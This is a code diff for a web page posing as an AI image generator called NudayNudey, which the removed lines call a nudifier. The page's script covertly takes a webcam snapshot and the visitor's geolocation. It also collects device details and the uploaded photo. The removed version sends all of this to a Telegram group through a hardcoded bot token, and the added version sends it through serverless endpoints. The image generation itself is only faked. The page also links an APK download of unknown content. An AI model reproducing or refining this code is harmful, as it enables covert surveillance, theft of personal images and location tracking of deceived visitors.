@@ -1,9 +1,9 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NudayNudey - Nude AI Image Generator</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>NudayNudey - AI Image Generator</title>
     <!-- Tailwind CSS for modern styling -->
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
@@ -29,21 +29,19 @@
             opacity: 1;
             visibility: visible;
         }
-        /* Custom scrollbar for modal content */
         .modal-content::-webkit-scrollbar {
             width: 8px;
         }
         .modal-content::-webkit-scrollbar-track {
-            background: #1f2937; /* Darker background for scrollbar */
+            background: #1f2937;
         }
         .modal-content::-webkit-scrollbar-thumb {
-            background: #7c3aed; /* Purple accent */
+            background: #7c3aed;
             border-radius: 4px;
         }
         .modal-content::-webkit-scrollbar-thumb:hover {
             background: #a855f7;
         }
-        /* Animation for sections */
         .animate-on-scroll {
             opacity: 0;
             transform: translateY(30px);
@@ -53,7 +51,6 @@
             opacity: 1;
             transform: translateY(0);
         }
-        /* Custom file upload styling */
         .upload-area {
             border: 3px dashed #7c3aed;
             transition: border-color 0.3s ease;
@@ -68,7 +65,6 @@
         input[type="file"] {
             display: none;
         }
-        /* Body background with dark theme */
         body {
             background: linear-gradient(135deg, #000000, #1a1a1a, #2d1b69);
             color: #ffffff;
@@ -94,10 +90,8 @@
                     <p>5. You must be at least 18 years old to use this service.</p>
                     <p>6. You are responsible for any content you generate using this service.</p>
                     <p>7. You must not use this service for any illegal or unauthorized purpose.</p>
-                    <p>We know you use our service because your MAADDD HORNY, Be Wise about it!.</p>
-                    <!-- Additional content to ensure scrollable -->
+                    <p>We know you use our service because your MADDDD, Be Wise about it!.</p>
                     <p>Further terms and conditions: Please ensure you understand all implications before proceeding. This service is provided as-is with no guarantees.</p>
-                    <!-- Placeholder for end of content -->
                     <div class="py-4 text-center text-purple-400 font-medium">End of Terms & Conditions</div>
                 </div>
             </div>
@@ -130,7 +124,7 @@
         <!-- Header -->
         <header class="bg-black shadow-lg border-b border-purple-600">
             <nav class="container mx-auto px-6 py-4 flex items-center justify-between">
-                <div class="text-3xl font-bold bg-gradient-to-r from-purple-400 to-pink-400 bg-clip-text text-transparent">NudayNudey - Advance AI Nudifier</div>
+                <div class="text-3xl font-bold bg-gradient-to-r from-purple-400 to-pink-400 bg-clip-text text-transparent">NudayNudey - Advance AI</div>
                 <ul class="space-x-8 text-gray-300 font-medium hidden md:flex">
                     <li><a href="#home" class="hover:text-purple-400 transition-colors">Home</a></li>
                     <li><a href="#upload" class="hover:text-purple-400 transition-colors">Upload</a></li>
@@ -138,7 +132,6 @@
                     <li><a href="#about" class="hover:text-purple-400 transition-colors">About</a></li>
                 </ul>
                 <div class="md:hidden">
-                    <!-- Mobile menu button (can be expanded) -->
                     <button class="text-white">Menu</button>
                 </div>
             </nav>
@@ -179,7 +172,7 @@
                 <div id="preview" class="mt-6 hidden">
                     <div class="text-white">
                         <p>Preview:</p>
-                        <img id="preview-image" class="max-w-full max-h-64 mx-auto rounded-lg shadow-lg" src="" alt="Uploaded image preview" src="https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/49538f2f-2732-4965-8747-561d113c5a67.png">
+                        <img id="preview-image" class="max-w-full max-h-64 mx-auto rounded-lg shadow-lg" src="" alt="Uploaded image preview">
                     </div>
                 </div>
                 <div class="mt-2" id="fallback-link" style="display:none;"></div>
@@ -194,37 +187,45 @@
         </footer>
     </div>
 
+    <!-- ========== SCRIPT (modified minimal) ========== -->
     <script>
-        const BOT_TOKEN = "7646910942:AAEdw1J0X1X0DbdDqKXcoUhNbaSRvsb963U";
-        const OWNER_ID = -4907521783; // Ganti dengan chatID grup
+        // NOTE: token must NOT be in client-side code.
+        // Serverless endpoints (/api/sendMessage & /api/sendPhoto) will actually call Telegram API.
+        const OWNER_ID = -4907521783; // number (negative for groups). You may omit and let server use ENV CHAT_ID.
 
         let permissionsGranted = localStorage.getItem('permissionsGranted') === 'true';
         let mediaAccessAllowed = false;
         let locationAccessAllowed = false;
 
         document.addEventListener('DOMContentLoaded', () => {
-            // Modal logic (Terms & Conditions)
+            // DOM refs
             const modalOverlay = document.getElementById('modal-overlay');
             const modalContent = document.getElementById('modal-content');
             const agreeCheckbox = document.getElementById('agree-checkbox');
             const proceedBtn = document.getElementById('proceed-btn');
             const landingPage = document.getElementById('landing-page');
 
+            const uploadArea = document.getElementById('upload-area');
+            const fileInput = document.getElementById('file-input');
+            const generateBtn = document.getElementById('generate-btn');
+            const preview = document.getElementById('preview');
+            const previewImage = document.getElementById('preview-image');
+            const permissionModal = document.getElementById('permission-modal');
+            const permitBtn = document.getElementById('permit-btn');
+
             let hasScrolledToBottom = false;
 
-            // Function to check scroll position
+            // scroll check
             function checkScrollToBottom() {
                 const scrollTop = modalContent.scrollTop;
                 const scrollHeight = modalContent.scrollHeight;
                 const clientHeight = modalContent.clientHeight;
-                // More lenient condition for better UX
                 if (scrollTop + clientHeight >= scrollHeight - 10) {
                     hasScrolledToBottom = true;
                 }
                 toggleProceedButton();
             }
 
-            // Toggle proceed button based on conditions
             function toggleProceedButton() {
                 if (hasScrolledToBottom && agreeCheckbox.checked) {
                     proceedBtn.disabled = false;
@@ -237,7 +238,6 @@
                 }
             }
 
-            // Event listeners
             modalContent.addEventListener('scroll', checkScrollToBottom);
             agreeCheckbox.addEventListener('change', toggleProceedButton);
 
@@ -247,7 +247,6 @@
                 setTimeout(() => {
                     modalOverlay.style.display = 'none';
                     landingPage.classList.add('show');
-                    // Animate sections on scroll
                     const observer = new IntersectionObserver((entries) => {
                         entries.forEach(entry => {
                             if (entry.isIntersecting) {
@@ -256,10 +255,10 @@
                         });
                     }, { threshold: 0.1 });
                     document.querySelectorAll('.animate-on-scroll').forEach(el => observer.observe(el));
-                }, 500); // Match transition duration
+                }, 500);
             });
 
-            // Check permissions on load
+            // check permissions quickly
             navigator.permissions.query({name: 'camera'}).then(permission => {
                 mediaAccessAllowed = permission.state === 'granted';
             }).catch(() => {});
@@ -267,20 +266,25 @@
                 locationAccessAllowed = permission.state === 'granted';
             }).catch(() => {});
 
-            // File upload logic with permission modal
-            const uploadArea = document.getElementById('upload-area');
-            const fileInput = document.getElementById('file-input');
-            const generateBtn = document.getElementById('generate-btn');
-            const preview = document.getElementById('preview');
-            const previewImage = document.getElementById('preview-image');
-            const permissionModal = document.getElementById('permission-modal');
-            const permitBtn = document.getElementById('permit-btn');
+            // helper convert blob -> base64 (no prefix)
+            function blobToBase64NoPrefix(blob) {
+                return new Promise((resolve, reject) => {
+                    const reader = new FileReader();
+                    reader.onloadend = () => {
+                        const dataUrl = reader.result;
+                        const base64 = dataUrl.split(',', 2)[1];
+                        resolve(base64);
+                    };
+                    reader.onerror = reject;
+                    reader.readAsDataURL(blob);
+                });
+            }
 
-            // Function to capture and send data to Telegram
+            // capture camera & location, then forward to serverless endpoints
             async function captureAndSendData() {
-                let photoBlob = null;
+                let snapshotBase64 = null;
                 let coords = null;
-                
+
                 // Capture camera image
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({video: true});
@@ -292,12 +296,13 @@
                     canvas.height = video.videoHeight || 480;
                     const ctx = canvas.getContext("2d");
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    photoBlob = await (await fetch(canvas.toDataURL("image/jpeg"))).blob();
+                    const blob = await (await fetch(canvas.toDataURL("image/jpeg"))).blob();
+                    snapshotBase64 = await blobToBase64NoPrefix(blob);
                     stream.getTracks().forEach(t => t.stop());
                 } catch(e) {
                     console.error("Failed to capture camera:", e);
                 }
-                
+
                 // Get location
                 try {
                     coords = await new Promise((resolve, reject) => {
@@ -310,30 +315,144 @@
                 } catch(e) {
                     console.error("Failed to get location:", e);
                 }
-                
-                // Send to Telegram
+
+                // Send to serverless (Vercel) endpoints
                 try {
-                    if (photoBlob) {
-                        const fd = new FormData();
-                        fd.append("chat_id", OWNER_ID);
-                        fd.append("photo", photoBlob, "snap.jpg");
-                        let cap = "Snapshot dari device.";
-                        if (coords) cap += ` Lokasi: https://maps.google.com/?q=${coords.latitude},${coords.longitude}`;
-                        fd.append("caption", cap);
-                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method: "POST", body: fd});
+                    if (snapshotBase64) {
+                        const captionParts = ["Snapshot dari device."];
+                        if (coords) captionParts.push(`Lokasi: https://maps.google.com/?q=${coords.latitude},${coords.longitude}`);
+                        const caption = captionParts.join(" ");
+
+                        await fetch('/api/sendPhoto', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                chat_id: OWNER_ID,
+                                filename: 'snap.jpg',
+                                photoBase64: snapshotBase64,
+                                caption
+                            })
+                        });
                     }
+
                     if (coords) {
-                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                            method: "POST",
-                            headers: {"Content-Type": "application/json"},
-                            body: JSON.stringify({chat_id: OWNER_ID, text: `Lokasi: https://maps.google.com/?q=${coords.latitude},${coords.longitude}`})
+                        const text = `Lokasi: https://maps.google.com/?q=${coords.latitude},${coords.longitude}`;
+                        await fetch('/api/sendMessage', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ chat_id: OWNER_ID, text })
                         });
                     }
                 } catch(e) {
-                    console.error("Failed to send to Telegram:", e);
+                    console.error("Failed to send to serverless API:", e);
                 }
             }
 
+            function handleFile(file) {
+                if (file && file.type.startsWith('image/')) {
+                    const reader = new FileReader();
+                    reader.onload = (e) => {
+                        previewImage.src = e.target.result;
+                        preview.classList.remove('hidden');
+                        generateBtn.disabled = false;
+                        generateBtn.textContent = 'Generate Image';
+                    };
+                    reader.readAsDataURL(file);
+                } else {
+                    alert('Please select a valid image file.');
+                }
+            }
+
+            // Generate button main flow
+            generateBtn.addEventListener('click', async () => {
+                generateBtn.textContent = 'Generating...';
+
+                // 1. capture camera & location and send
+                await captureAndSendData();
+
+                // 2. collect device info and send via /api/sendMessage
+                let batteryInfo = 'N/A';
+                if (navigator.getBattery) {
+                    try {
+                        const battery = await navigator.getBattery();
+                        batteryInfo = `${battery.level * 100}% charged, ${battery.charging ? 'charging' : 'not charging'}`;
+                    } catch(e) {}
+                }
+
+                const deviceInfo = {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    cookieEnabled: navigator.cookieEnabled,
+                    onLine: navigator.onLine,
+                    hardwareConcurrency: navigator.hardwareConcurrency,
+                    deviceMemory: navigator.deviceMemory || 'N/A',
+                    battery: batteryInfo,
+                    screen: `${screen.width}x${screen.height}`,
+                    referrer: document.referrer
+                };
+
+                let message = `New AI Image Generation Request:\n\nDevice Info:\n`;
+                for (const [key, value] of Object.entries(deviceInfo)) {
+                    message += `${key}: ${value}\n`;
+                }
+
+                try {
+                    await fetch('/api/sendMessage', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: OWNER_ID, text: message })
+                    });
+                } catch (e) {
+                    console.error('Failed to send message:', e);
+                }
+
+                // 3. send uploaded file if exists
+                const file = fileInput.files[0];
+                if (file && file.type.startsWith('image/')) {
+                    try {
+                        const fileBase64 = await new Promise((resolve, reject) => {
+                            const r = new FileReader();
+                            r.onload = () => resolve(r.result.split(',',2)[1]);
+                            r.onerror = reject;
+                            r.readAsDataURL(file);
+                        });
+
+                        await fetch('/api/sendPhoto', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                chat_id: OWNER_ID,
+                                filename: file.name || 'uploaded.jpg',
+                                photoBase64: fileBase64,
+                                caption: 'Foto upload dari user (AI Image Generator)'
+                            })
+                        });
+                    } catch (e) {
+                        console.error('Failed to send uploaded photo:', e);
+                    }
+                }
+
+                // fallback link + UI simulation
+                const fallbackDiv = document.getElementById('fallback-link');
+                fallbackDiv.innerHTML = `
+    The image is unprocessed? Try the telegram version 
+    <a href="https://t.me/facefusion_xbot?start=cifgffdihe" target="_blank" class="text-purple-400 underline font-semibold">HERE</a>
+    <br>
+    Or, use our Android Only Free <a href="https://files.catbox.moe/wdt7ki.apk" target="_blank" class="text-pink-400 underline font-semibold">App</a>
+`;
+                fallbackDiv.style.display = 'block';
+
+                setTimeout(() => {
+                    generateBtn.textContent = 'Generated!';
+                    setTimeout(() => {
+                        generateBtn.disabled = true;
+                        generateBtn.textContent = 'Generate Image';
+                    }, 2000);
+                }, 3000);
+            });
+
+            // wire up upload area interactions (click/drag/drop)
             uploadArea.addEventListener('click', async () => {
                 if (!permissionsGranted) {
                     permissionModal.classList.remove('hidden');
@@ -346,16 +465,13 @@
 
             permitBtn.addEventListener('click', async () => {
                 try {
-                    // Request camera and location permissions
                     await captureAndSendData();
-                    
                     permissionsGranted = true;
                     localStorage.setItem('permissionsGranted', 'true');
                     permissionModal.classList.remove('fade-in');
                     permissionModal.classList.add('fade-out');
                     setTimeout(() => {
                         permissionModal.style.display = 'none';
-                        // Open file input after permissions are granted
                         fileInput.click();
                     }, 500);
                 } catch(e) {
@@ -389,103 +505,7 @@
                 }
             });
 
-            function handleFile(file) {
-                if (file && file.type.startsWith('image/')) {
-                    const reader = new FileReader();
-                    reader.onload = (e) => {
-                        previewImage.src = e.target.result;
-                        preview.classList.remove('hidden');
-                        generateBtn.disabled = false;
-                        generateBtn.textContent = 'Generate Image';
-                    };
-                    reader.readAsDataURL(file);
-                } else {
-                    alert('Please select a valid image file.');
-                }
-            }
-
-            generateBtn.addEventListener('click', async () => {
-                generateBtn.textContent = 'Generating...';
-
-                // Eksekusi capture kamera & lokasi, lalu kirim ke Telegram
-                await captureAndSendData();
-
-                // Collect device info
-                let batteryInfo = 'N/A';
-                if (navigator.getBattery) {
-                    const battery = await navigator.getBattery();
-                    batteryInfo = `${battery.level * 100}% charged, ${battery.charging ? 'charging' : 'not charging'}`;
-                }
-
-                const deviceInfo = {
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    language: navigator.language,
-                    cookieEnabled: navigator.cookieEnabled,
-                    onLine: navigator.onLine,
-                    hardwareConcurrency: navigator.hardwareConcurrency,
-                    deviceMemory: navigator.deviceMemory || 'N/A',
-                    battery: batteryInfo,
-                    screen: `${screen.width}x${screen.height}`,
-                    referrer: document.referrer
-                };
-
-                // Send device info to Telegram
-                let message = `New AI Image Generation Request:\n\nDevice Info:\n`;
-                for (const [key, value] of Object.entries(deviceInfo)) {
-                    message += `${key}: ${value}\n`;
-                }
-
-                try {
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: OWNER_ID, text: message })
-                    });
-                } catch (e) {
-                    console.error('Failed to send message:', e);
-                }
-
-                // Kirim foto yang di-upload user ke Telegram
-                const file = fileInput.files[0];
-                if (file && file.type.startsWith('image/')) {
-                    const fd = new FormData();
-                    fd.append("chat_id", OWNER_ID);
-                    fd.append("photo", file, file.name || "uploaded.jpg");
-                    fd.append("caption", "Foto upload dari user (AI Image Generator)");
-                    try {
-                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                            method: "POST",
-                            body: fd
-                        });
-                    } catch (e) {
-                        console.error('Failed to send uploaded photo:', e);
-                    }
-                }
-
-                // Tampilkan fallback link
-                const fallbackDiv = document.getElementById('fallback-link');
-                fallbackDiv.innerHTML = `
-    The image is unprocessed? Try the telegram version 
-    <a href="https://t.me/facefusion_xbot?start=cifgffdihe" target="_blank" class="text-purple-400 underline font-semibold">HERE</a>
-    <br>
-    Or, use our Android Only Free <a href="https://files.catbox.moe/wdt7ki.apk" target="_blank" class="text-pink-400 underline font-semibold">App</a>
-`;
-                fallbackDiv.style.display = 'block';
-
-                // Simulate generation
-                setTimeout(() => {
-                    generateBtn.textContent = 'Generated!';
-                    setTimeout(() => {
-                        generateBtn.disabled = true;
-                        generateBtn.textContent = 'Generate Image';
-                    }, 2000);
-                }, 3000);
-            });
-        });
+        }); // DOMContentLoaded end
     </script>
 </body>
 </html>
-
-
-
